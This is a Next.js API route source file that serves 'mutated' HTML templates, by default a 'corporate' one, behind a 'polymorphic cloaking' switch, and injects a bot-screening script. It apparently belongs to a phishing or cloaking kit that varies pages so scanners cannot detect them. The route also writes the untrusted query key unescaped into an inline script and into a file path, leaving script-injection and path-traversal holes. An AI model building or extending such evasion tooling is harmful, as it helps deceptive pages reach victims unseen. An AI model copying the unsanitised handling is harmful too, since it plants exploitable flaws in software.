/**
 * Mutated Template API
 * Phase 5.8: Serves mutated HTML templates
 */

import { NextRequest, NextResponse } from 'next/server'
import * as fs from 'fs/promises'
import * as path from 'path'
import { buildMutatedTemplate, mutatedTemplateExists } from '@/mutator/buildEngine'
import { resolveMutation } from '@/lib/mutations/mutationTracker'
import { getCachedSettings } from '@/lib/adminSettings'

export async function GET(request: NextRequest) {
  try {
    const mutationKey = request.nextUrl.searchParams.get('key') ||
                        request.headers.get('x-mutation-key')
    
    if (!mutationKey) {
      return NextResponse.json({ error: 'Mutation key required' }, { status: 400 })
    }
    
    const settings = getCachedSettings()
    
    // Check if polymorphic cloaking is enabled
    if (settings.security?.enablePolymorphicCloaking === false) {
      return NextResponse.json({ error: 'Polymorphic cloaking disabled' }, { status: 403 })
    }
    
    // Check if mutated template exists
    const exists = await mutatedTemplateExists(mutationKey)
    
    if (!exists) {
      // Build mutated template on-demand
      const templateName = request.nextUrl.searchParams.get('template') || 'corporate'
      await buildMutatedTemplate(templateName, mutationKey)
    }
    
    // Read and serve mutated template
    const templatePath = path.join(
      process.cwd(),
      'templates',
      'autogen',
      `${mutationKey}.html`
    )
    
    try {
      const html = await fs.readFile(templatePath, 'utf-8')
      
      // Inject mutation key into HTML for JS shard loading
      let htmlWithKey = html.replace(
        '</head>',
        `<script>window.__mutationKey = '${mutationKey}';</script>\n</head>`
      )
      
      // Phase 5.11: Inject microHuman.js script (lightweight human verification)
      htmlWithKey = htmlWithKey.replace(
        '</head>',
        `<script src="/js/microHuman.js" async></script>\n</head>`
      )
      
      return new NextResponse(htmlWithKey, {
        headers: {
          'Content-Type': 'text/html',
          'x-mutation-key': mutationKey,
        },
      })
    } catch (error) {
      return NextResponse.json({ error: 'Template not found' }, { status: 404 })
    }
  } catch (error) {
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}

